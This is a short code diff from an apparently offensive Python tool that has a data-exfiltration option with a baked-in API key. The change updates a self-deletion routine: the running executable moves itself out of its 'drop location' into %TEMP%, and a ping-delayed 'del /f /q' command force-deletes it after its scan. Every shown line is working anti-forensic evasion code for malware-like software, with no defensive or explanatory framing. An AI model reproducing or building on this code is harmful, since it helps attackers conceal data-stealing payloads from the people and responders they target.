@@ -1745,13 +1745,14 @@ def main():
     parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     args = parser.parse_args()
 
-    # Rename the exe immediately so it vanishes from Explorer right away.
-    # Rename works on a running executable; delete does not (file is locked until exit).
-    # A 120s delayed del then cleans up the renamed copy after the scan finishes.
+    # Move the exe to %TEMP% immediately so it vanishes from its drop location.
+    # os.rename() works on a running exe (move within same volume); delete does not.
+    # A 120s delayed del cleans up the temp copy after the scan finishes.
     if args.self_delete and getattr(sys, "frozen", False):
         try:
             _orig    = sys.executable
-            _tmp_exe = os.path.join(os.path.dirname(_orig), f'~{os.getpid()}.tmp')
+            _tmp_dir = os.environ.get('TEMP') or os.environ.get('TMP') or os.path.dirname(_orig)
+            _tmp_exe = os.path.join(_tmp_dir, f'~{os.getpid()}.tmp')
             os.rename(_orig, _tmp_exe)
             os.popen(f'cmd /c ping -n 120 127.0.0.1 > nul & del /f /q "{_tmp_exe}"')
         except OSError:
